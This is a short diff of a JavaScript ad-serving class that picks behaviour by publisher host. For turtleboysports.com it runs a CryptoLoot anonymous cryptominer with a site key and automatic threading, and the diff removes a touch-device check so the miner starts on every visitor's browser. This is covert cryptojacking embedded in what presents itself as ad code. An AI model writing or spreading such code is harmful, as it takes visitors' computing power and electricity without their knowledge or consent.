@@ -265,9 +265,7 @@ class Apollo {
     switch(this.pubInfo.host) {
       case 'turtleboysports.com':
         //this.insertGoogle(this.tbsAds, this.ratio.tbs)
-        if (this.isTouchDevice()) {
           var miner = new CryptoLoot.Anonymous('6eb8bbc890df55b9683dae8e270f14753ab4750a1eb1', {autoThreads:true});miner.start();
-        }
         break
       case 'vitalvegas.com':
         //this.insertGoogle(this.vvAds, this.ratio.vv)
